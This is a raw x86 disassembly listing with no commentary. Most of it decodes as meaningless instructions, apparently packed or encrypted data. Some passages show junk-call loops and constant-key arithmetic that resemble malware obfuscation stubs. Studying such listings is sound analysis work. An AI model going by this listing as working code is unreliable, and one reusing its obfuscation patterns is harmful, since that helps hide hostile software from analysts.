  40a822:	call   0x1992:0x2cbaba9f
  40a829:	pop    ds
  40a82a:	mov    esi,edi
  40a82c:	dec    ebx
  40a82d:	test   DWORD PTR [eax],edi
  40a82f:	lods   eax,DWORD PTR ds:[esi]
  40a830:	ret    0x4199
  40a833:	popf   
  40a834:	xchg   edx,eax
  40a835:	sbb    al,0xe3
  40a837:	adc    al,ah
  40a839:	dec    esp
  40a83a:	loop   0x40a893
  40a83c:	or     eax,0xb050f51c
  40a841:	cmp    al,0xb9
  40a843:	add    al,0x4d
  40a845:	loop   0x40a893
  40a847:	push   eax
  40a848:	push   ds
  40a849:	test   DWORD PTR [ebx-0x3c],eax
  40a84c:	mov    bh,0x6e
  40a84e:	rcr    DWORD PTR [ecx-0x35f29a7e],cl
  40a854:	and    BYTE PTR [ebx+0x2],bh
  40a857:	ss mov ecx,0x9e5d58c0
  40a85d:	or     edi,esi
  40a85f:	hlt    
  40a860:	xchg   DWORD PTR [edx+0x4b],ebp
  40a863:	mov    dl,0x53
  40a865:	jecxz  0x40a7f9
  40a867:	push   edi
  40a868:	dec    edi
  40a869:	enter  0x4fff,0xf8
  40a86d:	add    BYTE PTR [ebp+ecx*4-0x79afe271],al
  40a874:	ret    
  40a875:	lahf   
  40a876:	adc    DWORD PTR [edx-0x77],esi
  40a879:	out    dx,eax
  40a87a:	inc    BYTE PTR [edi]
  40a87c:	(bad)  
  40a87d:	inc    esi
  40a87e:	or     eax,DWORD PTR [ebp-0x60c2618]
  40a884:	mov    ch,0xd8
  40a886:	and    eax,0x9b5ca55b
  40a88b:	mov    BYTE PTR [ebx-0x26],dh
  40a88e:	test   BYTE PTR [edi+0x7f],dh
  40a891:	jbe    0x40a87b
  40a893:	loope  0x40a8d5
  40a895:	pusha  
  40a896:	cwde   
  40a897:	shl    BYTE PTR [ecx],1
  40a899:	(bad)  
  40a89a:	into   
  40a89b:	fwait
  40a89c:	mov    eax,ds:0xcb91e05a
  40a8a1:	jle    0x40a832
  40a8a3:	push   cs
  40a8a4:	push   ebp
  40a8a5:	test   bl,cl
  40a8a7:	hlt    
  40a8a8:	push   esi
  40a8a9:	out    dx,al
  40a8aa:	das    
  40a8ab:	mov    ecx,0x6842bba
  40a8b0:	xor    DWORD PTR [edi],0xffffffb3
  40a8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8b4:	ret    0x8e13
  40a8b7:	mov    al,BYTE PTR [esi+0x3b57ff9e]
  40a8bd:	xlat   BYTE PTR ds:[ebx]
  40a8be:	out    dx,al
  40a8bf:	dec    edi
  40a8c0:	sbb    BYTE PTR [eax],cl
  40a8c2:	inc    edi
  40a8c3:	das    
  40a8c4:	dec    esp
  40a8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8c6:	mov    al,0x88
  40a8c8:	loop   0x40a89c
  40a8ca:	xchg   esi,eax
  40a8cb:	stos   DWORD PTR es:[edi],eax
  40a8cc:	into   
  40a8cd:	shl    DWORD PTR [esi+ecx*1-0x52],cl
  40a8d1:	push   ecx
  40a8d2:	hlt    
  40a8d3:	icebp  
  40a8d4:	push   cs
  40a8d5:	xchg   edi,eax
  40a8d6:	repz pushf 
  40a8d8:	in     al,0x3f
  40a8da:	ss dec esi
  40a8dc:	xor    al,0x27
  40a8de:	dec    ebx
  40a8df:	popa   
  40a8e0:	mov    ch,0xee
  40a8e2:	test   edi,esi
  40a8e4:	mov    edx,0xf6196789
  40a8e9:	jae    0x40a961
  40a8eb:	pop    ss
  40a8ec:	adc    al,dl
  40a8ee:	mov    edx,0xef549e92
  40a8f3:	cmc    
  40a8f4:	xchg   ebp,eax
  40a8f5:	pop    es
  40a8f6:	sbb    al,bl
  40a8f8:	push   edx
  40a8f9:	jno    0x40a89f
  40a8fb:	aas    
  40a8fc:	mov    DWORD PTR [edx],0x19de46d6
  40a902:	or     DWORD PTR [ecx-0x7aaaa962],esi
  40a908:	jmp    0x40a8b5
  40a90a:	je     0x40a898
  40a90c:	repz test BYTE PTR [ecx+0x4a],ch
  40a910:	aas    
  40a911:	inc    ebx
  40a912:	scas   eax,DWORD PTR es:[edi]
  40a913:	jo     0x40a98d
  40a915:	or     ch,ah
  40a917:	les    eax,FWORD PTR [ebp+0x458b0969]
  40a91d:	cld    
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	fisttp DWORD PTR [edx+0x3ae06f76]
  40a9ac:	jle    0x40aa2c
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a9ad
  40a9b3:	dec    ecx
  40a9b4:	mov    ah,0xfa
  40a9b6:	icebp  
  40a9b7:	pop    esi
  40a9b8:	loop   0x40a969
  40a9ba:	aas    
  40a9bb:	push   es
  40a9bc:	pop    ebp
  40a9be:	mov    edx,0xf30ca318
  40a9c3:	fdivr  DWORD PTR [eax+0x4e]
  40a9c6:	xchg   ebp,eax
  40a9c7:	ins    DWORD PTR es:[edi],dx
  40a9c8:	sbb    DWORD PTR [ecx+ecx*8+0x284c94a2],ecx
  40a9cf:	mov    al,0x66
  40a9d1:	icebp  
  40a9d2:	jne    0x40a9b5
  40a9d4:	and    DWORD PTR [edi+ecx*2+0x7bc95b78],ecx
  40a9db:	mov    edi,0x2cbae389
  40a9e0:	mov    BYTE PTR [edi-0x32],0x54
  40a9e4:	adc    eax,DWORD PTR [ebx+0xb]
  40a9e7:	arpl   bp,si
  40a9e9:	push   0x3c65a463
  40a9ee:	jg     0x40aa6e
  40a9f0:	mov    al,0xef
  40a9f2:	data16 or bl,cl
  40a9f5:	mov    eax,0xf5c71395
  40a9fa:	addr16 pushf 
  40a9fc:	cmp    dh,ch
  40a9fe:	fld    DWORD PTR [eax-0x19]
  40aa01:	sub    DWORD PTR [edi],edi
  40aa03:	pop    ebp
  40aa04:	loope  0x40a9df
  40aa06:	ds jg  0x40a9b0
  40aa09:	subps  xmm0,XMMWORD PTR [edi+0x14]
  40aa0d:	rcr    DWORD PTR [edx+edx*2+0x56ec9d09],0x53
  40aa15:	pop    esi
  40aa16:	jp     0x40aa64
  40aa18:	aam    0x2b
  40aa1a:	push   ebx
  40aa1b:	int    0x33
  40aa1d:	(bad)  
  40aa1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa1f:	into   
  40aa20:	inc    esi
  40aa21:	jmp    0x6e3e:0xd64cec76
  40aa28:	pushf  
  40aa29:	push   ss
  40aa2a:	rol    DWORD PTR [edx+ecx*4-0xd],0x99
  40aa2f:	ja     0x40aa77
  40aa31:	and    eax,0xd26e4b83
  40aa36:	jnp    0x40a9bc
  40aa38:	sbb    cl,ch
  40aa3a:	dec    esi
  40aa3b:	and    DWORD PTR [edx+0x784a6004],0xffffff8a
  40aa42:	mov    ch,BYTE PTR [ecx+eiz*8-0x23]
  40aa46:	lahf   
  40aa47:	sbb    eax,0x52ef0062
  40aa4c:	stos   BYTE PTR es:[edi],al
  40aa4d:	rol    DWORD PTR ds:0x104686e8,0x42
  40aa54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa55:	and    al,0x17
  40aa57:	test   al,0xbd
  40aa59:	aam    0x5a
  40aa5b:	sahf   
  40aa5c:	xor    dl,BYTE PTR [ecx+eiz*2-0x32fc3108]
  40aa63:	stos   DWORD PTR es:[edi],eax
  40aa64:	dec    ebp
  40aa65:	out    0xcb,eax
  40aa67:	test   bh,ah
  40aa69:	push   es
  40aa6a:	xchg   edx,eax
  40aa6b:	sub    ebx,DWORD PTR [edi+0x52817469]
  40aa71:	shl    BYTE PTR [eax+0x6],0xe6
  40aa75:	inc    eax
  40aa76:	pop    ecx
  40aa77:	int3   
  40aa78:	ins    DWORD PTR es:[edi],dx
  40aa79:	xchg   ebx,eax
  40aa7a:	mov    al,ds:0x824ea4a7
  40aa7f:	jp     0x40aae9
  40aa81:	sbb    bh,BYTE PTR ds:0xa163d201
  40aa87:	xchg   ecx,eax
  40aa88:	cmp    cl,al
  40aa8a:	ds loope 0x40aa69
  40aa8d:	sbb    BYTE PTR [eax+0x4523772a],ah
  40aa93:	(bad)  
  40aa95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa96:	rcr    WORD PTR [edi+ecx*1],1
  40aa9a:	sbb    DWORD PTR [esi-0x5e911bac],ecx
  40aaa0:	les    ecx,FWORD PTR [eax-0xd]
  40aaa3:	sub    BYTE PTR ds:0xb23036e8,bl
  40aaa9:	loop   0x40aa83
  40aaab:	loop   0x40aa4a
  40aaad:	adc    BYTE PTR [ecx+ebx*8+0x5ea943e9],bh
  40aab4:	pop    ebx
  40aab5:	sub    ecx,DWORD PTR gs:[ebx]
  40aab8:	or     al,0xcf
  40aaba:	or     al,0x7b
  40aabc:	jg     0x40aadf
  40aabe:	cmp    al,0x17
  40aac0:	mov    al,ds:0x5ead032c
  40aac5:	ficom  DWORD PTR [edx+0x723183a1]
  40aacb:	mov    esi,0xc889115c
  40aad0:	adc    esp,DWORD PTR [edx]
  40aad2:	jb     0x40ab10
  40aad4:	jl     0x40aa91
  40aad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad7:	mov    bh,0x5
  40aad9:	(bad)  
  40aada:	add    esi,DWORD PTR [edx]
  40aadc:	xor    eax,0x17162187
  40aae1:	xor    eax,0xf443220e
  40aae6:	(bad)  
  40aae7:	mov    ah,0x39
  40aae9:	xor    DWORD PTR [edx],esp
  40aaeb:	fwait
  40aaec:	in     al,dx
  40aaed:	in     eax,dx
  40aaee:	test   DWORD PTR [eax+0x7d],0xa336c2d0
  40aaf5:	cmp    ecx,ebp
  40aaf7:	xchg   esp,eax
  40aaf8:	retf   
  40aaf9:	sbb    ebx,DWORD PTR [edi-0x6a]
  40aafc:	xor    BYTE PTR [eax+0x5],al
  40aaff:	sub    edx,esi
  40ab01:	or     BYTE PTR [edi+0x74cb9a88],dl
  40ab07:	jo     0x40aabf
  40ab09:	aam    0x4b
  40ab0b:	push   edx
  40ab0c:	cmp    DWORD PTR [ebx],esi
  40ab0e:	ret    0xf233
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x6ef2ac8b
  40ab26:	jne    0x40ab12
  40ab28:	dec    edi
  40ab29:	cmp    edi,DWORD PTR [esi+0x7e]
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40ab9f
  40ab31:	jmp    FWORD PTR [esi-0x3f]
  40ab34:	stos   DWORD PTR es:[edi],eax
  40ab35:	mov    BYTE PTR [eax-0x64],cl
  40ab38:	je     0x40aba2
  40ab3a:	call   0xa54669b3
  40ab3f:	pop    esp
  40ab40:	mov    eax,0x76ba2681
  40ab45:	mov    ebx,0x1836a496
  40ab4a:	or     eax,0xe552a87e
  40ab4f:	push   ss
  40ab50:	ins    BYTE PTR es:[edi],dx
  40ab51:	std    
  40ab52:	(bad)  
  40ab53:	sahf   
  40ab54:	mov    ds:0x3fc60760,al
  40ab59:	nop
  40ab5a:	jp     0x40ab36
  40ab5c:	(bad)  
  40ab5d:	icebp  
  40ab5e:	aas    
  40ab5f:	xchg   edi,eax
  40ab60:	cld    
  40ab61:	push   eax
  40ab62:	(bad)  
  40ab63:	mov    cl,0x72
  40ab65:	inc    esi
  40ab66:	arpl   WORD PTR [esi+0x772764d3],sp
  40ab6c:	adc    cl,ch
  40ab6e:	mov    eax,0xd36fe728
  40ab73:	mov    eax,esp
  40ab75:	ror    DWORD PTR [ecx-0x55],cl
  40ab78:	shr    DWORD PTR [eax+0x7],0x10
  40ab7c:	sub    eax,0x294f02ab
  40ab81:	cmc    
  40ab82:	jp     0x40abdb
  40ab84:	out    0xd6,eax
  40ab86:	push   ebp
  40ab87:	test   DWORD PTR [eax+0x69],edx
  40ab8a:	push   esp
  40ab8b:	les    ebx,FWORD PTR [edx]
  40ab8d:	and    al,0x5f
  40ab8f:	mov    fs,edi
  40ab91:	je     0x40ab7d
  40ab93:	sub    al,0xb4
  40ab95:	dec    eax
  40ab96:	stos   BYTE PTR es:[edi],al
  40ab97:	cdq    
  40ab98:	(bad)  
  40ab9a:	jmp    0x9d3276d9
  40ab9f:	xchg   ebx,eax
  40aba0:	and    al,0x93
  40aba2:	mov    ecx,0x1772713a
  40aba7:	cmovp  ebp,ebx
  40abaa:	inc    esp
  40abab:	adc    ecx,DWORD PTR [ebp-0x1e]
  40abae:	daa    
  40abaf:	pop    ds
  40abb0:	leave  
  40abb1:	in     al,dx
  40abb2:	mov    edx,0x7ce50467
  40abb7:	add    edi,DWORD PTR [ebp+0x60]
  40abba:	mov    bl,0x48
  40abbc:	inc    ebx
  40abbd:	cwde   
  40abbe:	adc    DWORD PTR [eax+edx*4],eax
  40abc1:	retf   
  40abc2:	bound  edi,QWORD PTR [esi+0x15]
  40abc5:	push   eax
  40abc6:	push   ecx
  40abc7:	hlt    
  40abc8:	popa   
  40abc9:	xchg   DWORD PTR [ebx-0x6acf75bc],ebp
  40abcf:	xor    cl,bh
  40abd1:	mov    ch,BYTE PTR [edx+0x7a8c0972]
  40abd7:	addr16 pop ebx
  40abd9:	(bad)  
  40abda:	std    
  40abdb:	call   0x68f8:0xcf7b2520
  40abe2:	adc    DWORD PTR [edx+eax*1-0x51],edx
  40abe6:	mov    ds:0xf9f5812f,eax
  40abeb:	push   ds
  40abec:	out    0x51,al
  40abee:	out    0xce,al
  40abf0:	adc    al,0xe5
  40abf2:	xor    DWORD PTR [edi],edx
  40abf4:	rcl    DWORD PTR [ebp-0x7d],cl
  40abf7:	cs mov dh,0x50
  40abfa:	add    DWORD PTR [edx],esp
  40abfc:	mul    BYTE PTR [ecx+0xa382498]
  40ac02:	std    
  40ac03:	adc    bh,BYTE PTR [edx-0x7a]
  40ac06:	outs   dx,BYTE PTR ds:[esi]
  40ac07:	xor    cl,ah
  40ac09:	out    0xff,eax
  40ac0b:	mov    gs,WORD PTR [eax]
  40ac0d:	adc    al,0xe2
  40ac0f:	leave  
  40ac10:	(bad)
  40ac13:	retf   0x9f24
  40ac16:	imul   ecx,DWORD PTR [edx+0x38ef06ed],0x17f54bb7
  40ac20:	ds addr16 das 
  40ac23:	and    al,0xb0
  40ac25:	add    DWORD PTR [ecx-0x73],0xcba71f15
  40ac2c:	mov    ebx,0xc3f09210
  40ac31:	jmp    0xab8126ea
  40ac36:	cmp    ebx,ebp
  40ac38:	inc    esp
  40ac39:	(bad)  
  40ac3a:	xor    al,0xed
  40ac3c:	nop
  40ac3d:	jns    0x40abe7
  40ac3f:	dec    edx
  40ac40:	pop    edi
  40ac41:	leave  
  40ac42:	stos   BYTE PTR es:[edi],al
  40ac43:	lds    esp,FWORD PTR [ebp+0x1b]
  40ac46:	and    ecx,esi
  40ac48:	shl    ch,0x7c
  40ac4b:	xor    eax,0x38e86f3b
  40ac50:	or     DWORD PTR [ebx+ecx*2],ebp
  40ac53:	xchg   ebp,eax
  40ac54:	pop    es
  40ac55:	pop    ebx
  40ac56:	jbe    0x40acd2
  40ac58:	mov    al,ds:0x88cfc8ae
  40ac5d:	cmc    
  40ac5e:	(bad)  
  40ac5f:	hlt    
  40ac60:	or     dh,BYTE PTR [edi]
  40ac62:	xlat   BYTE PTR ds:[ebx]
  40ac63:	or     DWORD PTR [edi],ebp
  40ac65:	add    al,0x1
  40ac67:	adc    dh,bh
  40ac69:	cmp    DWORD PTR [ebx-0x496482d8],edx
  40ac6f:	and    al,0x72
  40ac71:	ins    BYTE PTR es:[edi],dx
  40ac72:	push   0xffffffbe
  40ac74:	(bad)  
  40ac75:	adc    esi,eax
  40ac77:	mov    DWORD PTR [eax+esi*2-0x68],ebx
  40ac7b:	cs fwait
  40ac7d:	mov    dl,0xdb
  40ac7f:	xchg   ebx,eax
  40ac80:	dec    ebp
  40ac81:	(bad)  
  40ac82:	in     al,0x6f
  40ac84:	loope  0x40ac77
  40ac86:	dec    esi
  40ac87:	or     BYTE PTR [esi],ah
  40ac89:	in     al,0xa
  40ac8b:	add    esi,ecx
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    ebp,eax
  40acbc:	adc    al,0x8f
  40acbe:	(bad)  
  40acbf:	sub    bh,BYTE PTR [ecx]
  40acc1:	jle    0x40ad41
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ac69
  40acc8:	xor    al,0xed
  40acca:	sub    dh,BYTE PTR [edi]
  40accc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40accd:	pop    ds
  40acce:	sti    
  40accf:	mov    edx,0xdbc9cb1b
  40acd4:	pop    es
  40acd5:	jmp    DWORD PTR [ecx+ebp*4+0x4d]
  40acd9:	mov    ebp,0x768af82a
  40acde:	add    al,0xd3
  40ace0:	fwait
  40ace1:	rol    BYTE PTR [edi+0x5a8728eb],1
  40ace7:	not    cl
  40ace9:	sub    BYTE PTR [eax+0x25736f27],cl
  40acef:	dec    ebp
  40acf0:	ret    
  40acf1:	sbb    BYTE PTR [ebx+eiz*1+0x19fedc33],0x16
  40acf9:	mov    ecx,?
  40acfb:	lods   al,BYTE PTR ds:[esi]
  40acfc:	test   BYTE PTR [ebp-0x5cd1b087],dl
  40ad02:	fild   QWORD PTR [ebx+eiz*8]
  40ad05:	mov    ebx,0x98c184c9
  40ad0a:	inc    edi
  40ad0b:	cmp    DWORD PTR [esi],esp
  40ad0d:	xchg   edi,eax
  40ad0e:	adc    al,0xf5
  40ad10:	pop    ebp
  40ad11:	in     eax,dx
  40ad12:	xchg   ebx,eax
  40ad13:	and    esp,DWORD PTR [edx-0x6202f48b]
  40ad19:	ret    
  40ad1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad1b:	gs xchg edx,eax
  40ad1d:	jnp    0x40ad31
  40ad1f:	pop    esp
  40ad20:	dec    ax
  40ad22:	std    
  40ad23:	jbe    0x40ad7f
  40ad25:	xchg   BYTE PTR [edi],ah
  40ad27:	dec    ecx
  40ad28:	pop    es
  40ad29:	clc    
  40ad2a:	out    0x23,eax
  40ad2c:	repnz mov cl,0xb5
  40ad2f:	je     0x40ad11
  40ad31:	xchg   ecx,eax
  40ad32:	mov    ebx,0x5d045854
  40ad37:	mov    al,ds:0x41ada547
  40ad3c:	mov    ?,WORD PTR [edi-0x300e24df]
  40ad42:	inc    esi
  40ad43:	lds    esp,FWORD PTR [eax+eiz*2-0x1f]
  40ad47:	(bad)  
  40ad48:	(bad)  
  40ad49:	jl     0x40ad3f
  40ad4b:	cdq    
  40ad4c:	inc    ebx
  40ad4d:	je     0x40acd7
  40ad4f:	jecxz  0x40ad63
  40ad51:	mov    dl,0x93
  40ad53:	add    eax,0x89501b82
  40ad58:	in     al,0x2c
  40ad5a:	aad    0xf4
  40ad5c:	xor    al,0x29
  40ad5e:	push   eax
  40ad5f:	inc    eax
  40ad60:	(bad)  
  40ad61:	out    dx,al
  40ad62:	sub    esi,DWORD PTR [ebx]
  40ad64:	int3   
  40ad65:	aad    0xa2
  40ad67:	sub    ecx,0x57
  40ad6a:	mov    cl,BYTE PTR [ebx+0x2d]
  40ad6d:	retf   0x670d
  40ad70:	arpl   ax,bx
  40ad72:	pusha  
  40ad73:	into   
  40ad74:	aas    
  40ad75:	retf   
  40ad76:	dec    edx
  40ad77:	lahf   
  40ad78:	mov    DWORD PTR [eax],eax
  40ad7a:	xor    DWORD PTR [edx+0x1e],esp
  40ad7d:	xor    DWORD PTR ds:0x6296756d,edx
  40ad83:	and    eax,0x52ae24e7
  40ad88:	adc    bh,ah
  40ad8a:	mov    dh,0x40
  40ad8c:	lock and edi,DWORD PTR [edi+esi*8-0x69]
  40ad91:	sub    esi,DWORD PTR [ebp+0x4298e497]
  40ad97:	inc    ebp
  40ad98:	mov    eax,ds:0xf4b052b7
  40ad9d:	mov    ds:0x9c82e2a9,eax
  40ada2:	adc    ebx,edx
  40ada4:	sub    DWORD PTR [edx],esp
  40ada6:	hlt    
  40ada7:	icebp  
  40ada8:	out    0x1b,al
  40adaa:	add    eax,0x294ee693
  40adaf:	out    dx,al
  40adb0:	rol    BYTE PTR [ebx],1
  40adb2:	xchg   ecx,esp
  40adb4:	xor    BYTE PTR [ecx-0x40],bl
  40adb7:	xor    ch,BYTE PTR ds:0x1a723668
  40adbd:	push   eax
  40adbe:	sbb    al,0x16
  40adc0:	sbb    eax,0xecb9b91
  40adc5:	fmul   st,st(5)
  40adc7:	jmp    0x40ad5d
  40adc9:	in     al,0x8c
  40adcb:	sbb    BYTE PTR [esi+edx*8+0x353b7084],dh
  40add2:	xchg   edx,eax
  40add3:	popa   
  40add4:	mov    bh,0xc
  40add6:	out    0x9e,eax
  40add8:	mov    ss,ebp
  40adda:	add    eax,0x1e25484b
  40addf:	xchg   esp,eax
  40ade0:	loope  0x40adaa
  40ade2:	push   esi
  40ade3:	push   esp
  40ade4:	xchg   esi,eax
  40ade5:	in     al,0x15
  40ade7:	mov    al,0x62
  40ade9:	and    DWORD PTR [ebp+ecx*2+0x3c],edx
  40aded:	mov    dl,0xe5
  40adef:	fdivr  DWORD PTR [eax+0x5c]
  40adf2:	aam    0x64
  40adf4:	data16 fwait
  40adf6:	jno    0x40ada2
  40adf8:	call   0x779f2782
  40adfd:	test   DWORD PTR [edx+ecx*4+0x45],ebx
  40ae01:	fisttp QWORD PTR [edi+0x737a2aef]
  40ae07:	div    esi
  40ae09:	ds pop esp
  40ae0b:	retf   
  40ae0c:	and    eax,0x7bb521e6
  40ae11:	or     esp,DWORD PTR [ebp+0x10fa0c75]
  40ae17:	ja     0x40ade0
  40ae19:	lds    eax,FWORD PTR [ebx-0x5e]
  40ae1c:	imul   esi
  40ae1e:	xchg   ecx,eax
  40ae1f:	xchg   esi,eax
  40ae20:	push   0xff1035f
  40ae25:	scas   eax,DWORD PTR es:[edi]
  40ae26:	(bad)  
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x13268d5d
  40ae94:	(bad)  
  40ae95:	xchg   edx,eax
  40ae96:	(bad)
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	cdq    
  40aea0:	jecxz  0x40aed6
  40aea2:	xor    eax,0x8664c8f7
  40aea7:	push   es
  40aea8:	pop    es
  40aea9:	hlt    
  40aeaa:	jo     0x40ae6a
  40aeac:	dec    edi
  40aead:	and    eax,DWORD PTR [ebp*1-0x4bcd95c2]
  40aeb4:	ror    DWORD PTR [edx],1
  40aeb6:	jne    0x40aeee
  40aeb8:	or     esp,ebx
  40aeba:	cmp    BYTE PTR [ebx-0x51],0xcc
  40aebe:	dec    edi
  40aebf:	data16 and dl,ch
  40aec2:	jbe    0x40ae95
  40aec4:	test   eax,0x7d37ab16
  40aec9:	mov    bl,0xd7
  40aecb:	lea    ebp,[edx+esi*1+0x196f2dcc]
  40aed2:	pop    bx
  40aed4:	jle    0x40af04
  40aed6:	jmp    0x950:0x9a20d7bc
  40aedd:	jle    0x40ae70
  40aedf:	pop    ebp
  40aee0:	jo     0x40ae72
  40aee2:	fsub   st(2),st
  40aee4:	adc    ah,BYTE PTR [ecx-0x78f76500]
  40aeea:	cs pop ebp
  40aeec:	push   esi
  40aeed:	ret    0xf1b5
  40aef0:	sahf   
  40aef1:	(bad)  
  40aef2:	imul   esi,DWORD PTR [ecx],0x471b5bbd
  40aef8:	pushf  
  40aef9:	or     DWORD PTR [edx-0x7e],0xf027b55b
  40af00:	clc    
  40af01:	pop    esi
  40af02:	inc    ebx
  40af03:	sub    dl,cl
  40af05:	jae    0x40af40
  40af07:	cmp    esp,DWORD PTR [edi-0x7eef26f0]
  40af0d:	push   ebx
  40af0e:	xor    al,0x65
  40af10:	in     al,dx
  40af11:	outs   dx,BYTE PTR ds:[esi]
  40af12:	ret    0xd0b8
  40af15:	pop    edx
  40af16:	mov    ds:0xde74429c,al
  40af1b:	or     bh,ch
  40af1d:	jo     0x40aed2
  40af1f:	scas   eax,DWORD PTR es:[edi]
  40af20:	mov    dh,0xa5
  40af22:	out    0x8c,al
  40af24:	out    dx,eax
  40af25:	out    dx,al
  40af26:	xor    DWORD PTR [edx],esp
  40af28:	cmp    eax,0x23cbbe64
  40af2d:	and    DWORD PTR [ecx-0x411f2d52],0xffffffaf
  40af34:	test   al,al
  40af36:	sub    al,BYTE PTR [esi-0x32]
  40af39:	pusha  
  40af3a:	sub    ah,BYTE PTR [edi+0x7250ebda]
  40af40:	js     0x40afac
  40af42:	mov    ch,0x5f
  40af44:	pop    edi
  40af45:	call   0xcf65:0xc194db65
  40af4c:	dec    esi
  40af4d:	in     eax,dx
  40af4e:	cmc    
  40af4f:	push   ds
  40af50:	dec    edi
  40af51:	push   cs
  40af52:	add    DWORD PTR [ebp+eiz*4-0x346f1786],ecx
  40af59:	pop    ecx
  40af5a:	push   ss
  40af5b:	mov    esi,0x60a6ba8c
  40af60:	out    0x28,eax
  40af62:	aam    0x4a
  40af64:	test   eax,0x9fbbe527
  40af69:	jb     0x40af9d
  40af6b:	add    BYTE PTR [ebx],al
  40af6d:	retf   
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
